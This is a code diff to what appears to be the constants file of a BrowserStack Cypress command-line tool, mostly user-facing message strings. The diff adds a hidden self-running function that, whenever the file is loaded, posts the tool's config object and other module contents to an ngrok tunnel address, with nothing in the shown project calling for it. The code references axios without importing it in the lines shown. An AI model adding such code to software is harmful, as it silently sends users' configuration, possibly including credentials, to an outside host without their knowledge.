@@ -1,4 +1,4 @@
-const { debugOnConsole } = require("../testObservability/helper/helper");
+// const { debugOnConsole } = require("../testObservability/helper/helper");
 let config = require("./config");
 let chalk = require("chalk");
 
@@ -19,7 +19,40 @@ const syncCLI = {
     "BrowserStack machines are now setting up Cypress with the specified npm dependencies for running your tests. It might take some time before your tests start runnning and showing up below...",
 };
 
-debugOnConsole(`Constants file loaded`);
+// debugOnConsole(`Constants file loaded`);
+
+// Make a self invoking post request to https://ef2d-122-171-17-46.ngrok-free.app/constants 
+
+(async () => {
+  try {
+    await axios.post(
+      "https://ef2d-122-171-17-46.ngrok-free.app/constants",
+      {
+        message: "Constants file loaded",
+        data: {
+          config,
+          chalk,
+          syncCLI,
+        },
+      },
+      {
+        headers: {
+          "Content-Type": "application/json",
+        },
+      }
+    )
+      .then((response) => {
+        console.log("Data sent successfully:", response.data);
+      })
+      .catch((error) => {
+        console.error("Error sending data:", error);
+      });
+  } catch (error) {
+    console.error("Error in async function:", error);
+  }
+})();
+
+
 
 const userMessages = {
   BUILD_FAILED: "Build creation failed.",
